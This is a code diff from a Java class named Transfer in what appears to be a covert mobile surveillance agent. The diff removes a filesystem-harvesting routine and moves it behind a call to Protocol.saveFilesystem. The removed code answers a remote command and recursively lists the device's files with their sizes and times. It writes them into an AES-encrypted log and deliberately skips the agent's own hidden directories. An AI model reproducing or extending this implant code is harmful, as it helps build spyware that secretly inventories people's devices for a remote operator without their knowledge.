@@ -420,9 +420,7 @@ public class Transfer {
         } else {
             throw new CommandException(); //"conf"
         }
-    }
-
-    Log fsLog;
+    }    
 
     /**
      * Receives and answers to a filesystem commands. The command is componed by
@@ -464,189 +462,14 @@ public class Transfer {
         //#endif
         sendCommand(Proto.OK);
 
-        fsLog = new Log(false, Keys.getInstance().getAesKey());
-        fsLog.createLog(null, LogType.FILESYSTEM);
-
-        // Expand path and create log
-        if (path.equals("/")) {
-            //#ifdef DEBUG
-            debug.trace("sendFilesystem: root");
-            //#endif
-            expandRoot(depth);
-        } else {
-            if (path.startsWith("//") && path.endsWith("/*")) {
-                path = path.substring(1, path.length() - 2);
-
-                expandPath(path, depth);
-            } else {
-                //#ifdef DEBUG
-                debug.error("sendFilesystem: strange path, ignoring it. "
-                        + path);
-                //#endif
-            }
-        }
-
-        fsLog.close();
+        Protocol.saveFilesystem(depth, path);
+        
+        
     }
 
-    /**
-     * Expand the root for a maximum depth. 0 means only root, 1 means its sons.
-     * 
-     * @param depth
-     */
-    private void expandRoot(int depth) {
-        //#ifdef DBC
-        Check.requires(depth > 0, "wrong recursion depth");
-        //#endif
+    
+   
 
-        saveRootLog(); // depth 0
-        final Enumeration roots = FileSystemRegistry.listRoots();
-
-        while (roots.hasMoreElements()) {
-            String root = (String) roots.nextElement();
-            if (root.endsWith("/")) {
-                root = root.substring(0, root.length() - 1);
-            }
-            //#ifdef DEBUG
-            debug.trace("expandRoot: " + root + " depth: " + depth);
-            //#endif
-            saveFilesystemLog("/" + root); // depth 1
-            if (depth - 1 > 0) {
-                // if depth is 0, no recursion is required
-                expandPath("/" + root, depth - 1); // depth 2+
-            }
-        }
-    }
-
-    /**
-     * saves the root log. We use this method because the directory "/" cannot
-     * be opened, we fake it.
-     */
-    private void saveRootLog() {
-        int version = 2010031501;
-
-        //#ifdef DBC
-        Check.requires(fsLog != null, "fsLog null");
-        //#endif
-        byte[] content = new byte[30];
-        DataBuffer databuffer = new DataBuffer(content, 0, content.length,
-                false);
-        databuffer.writeInt(version);
-        databuffer.writeInt(2); // len
-        databuffer.writeInt(1); // flags
-        databuffer.writeLong(0);
-        databuffer.writeLong(DateTime.getFiledate(new Date()));
-        databuffer.write(WChar.getBytes("/"));
-
-        fsLog.writeLog(content);
-    }
-
-    /**
-     * Expand recursively the path saving the log. When depth is 0 saves the log
-     * and stop recurring.
-     * 
-     * @param path
-     * @param depth
-     */
-    private void expandPath(String path, int depth) {
-        //#ifdef DBC
-        Check.requires(depth > 0, "wrong recursion depth");
-        Check.requires(path != null, "path==null");
-        Check.requires(!path.endsWith("/"), "path shouldn't end with /");
-        Check.requires(!path.endsWith("*"), "path shouldn't end with *");
-        //#endif
-
-        //#ifdef DEBUG
-        debug.trace("expandPath: " + path + " depth: " + depth);
-        //#endif
-
-        //saveFilesystemLog(path);
-        //if (depth > 0) {
-        for (Enumeration enum = Directory.find(path + "/*"); enum
-                .hasMoreElements();) {
-
-            String dPath = path + "/" + (String) enum.nextElement();
-            if (dPath.endsWith("/")) {
-                //#ifdef DEBUG
-                debug.trace("expandPath: dir");
-                //#endif
-                dPath = dPath.substring(0, dPath.length() - 1); // togli lo /
-            } else {
-                //#ifdef DEBUG
-                debug.trace("expandPath: file");
-                //#endif
-            }
-
-            if (dPath.indexOf(Utils.chomp(Path.SD(), "/")) >= 0
-                    || dPath.indexOf(Utils.chomp(Path.USER(), "/")) >= 0) {
-                //#ifdef DEBUG
-                debug.warn("expandPath ignoring hidden path: " + dPath);
-                //#endif
-                continue;
-            }
-
-            boolean isDir = saveFilesystemLog(dPath);
-            if (isDir && depth > 1) {
-                expandPath(dPath, depth - 1);
-            }
-        }
-        //}
-    }
-
-    private boolean saveFilesystemLog(String filepath) {
-        //#ifdef DBC
-        Check.requires(fsLog != null, "fsLog null");
-        Check.requires(!filepath.endsWith("/"), "path shouldn't end with /");
-        Check.requires(!filepath.endsWith("*"), "path shouldn't end with *");
-        //#endif
-
-        //#ifdef DEBUG
-        debug.info("save FilesystemLog: " + filepath);
-        //#endif
-        int version = 2010031501;
-
-        AutoFlashFile file = new AutoFlashFile(filepath);
-        if (!file.exists()) {
-            //#ifdef DEBUG
-            debug.error("non existing file: " + filepath);
-            //#endif
-            return false;
-        }
-
-        byte[] w_filepath = WChar.getBytes(filepath, true);
-
-        byte[] content = new byte[28 + w_filepath.length];
-        DataBuffer databuffer = new DataBuffer(content, 0, content.length,
-                false);
-
-        databuffer.writeInt(version);
-        databuffer.writeInt(w_filepath.length);
-
-        int flags = 0;
-        long size = file.getSize();
-
-        boolean isDir = file.isDirectory();
-        if (isDir) {
-            flags |= 1;
-        } else {
-            if (size == 0) {
-                flags |= 2;
-            }
-        }
-
-        databuffer.writeInt(flags);
-        databuffer.writeLong(size);
-        databuffer.writeLong(DateTime.getFiledate(file.getFileTime()));
-        databuffer.write(w_filepath);
-
-        fsLog.writeLog(content);
-
-        //#ifdef DEBUG
-        debug.trace("expandPath: written log");
-        //#endif
-
-        return isDir;
-    }
 
     /**
      * Send download.
